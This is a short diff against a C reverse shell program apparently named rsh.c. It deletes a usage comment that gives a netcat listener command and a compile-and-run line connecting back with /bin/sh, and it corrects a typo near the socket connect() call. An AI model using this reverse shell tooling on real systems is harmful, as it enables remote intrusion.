@@ -1,13 +1,3 @@
-/*
- * ===== usage =====
- * 
- * -----set up listener-----
- * nc -nvlp 1234
- * #----------compile---------- ----------set env vars--------------------      -------run it-------
- * clear; rm R;gcc -o R rsh.c && RP="1234" && RH="127.0.0.1" && BIN="/bin/sh"  && ./R $RP $RH $BIN
- * 
- */
-
 #include <stdarg.h>        // Includes standard argument handling library, though it's not used in this code
 #include <arpa/inet.h>   // Includes definitions for internet operations, such as `inet_addr` and `sockaddr_in`
 #include <stdio.h>          // Includes standard input/output functions, though only `printf` is used in the comments
@@ -33,7 +23,7 @@ int main(int argc, char **argv) {
 
 
   // this is where the actual 'magic' happens 
-  // Aka connecting the socket to the specified address and port (progra[:ip:port])
+  // Aka connecting the socket to the specified address and port (program[:ip:port])
     connect(is, (struct sockaddr *) &s1, sizeof(s1)); 
 
   /*
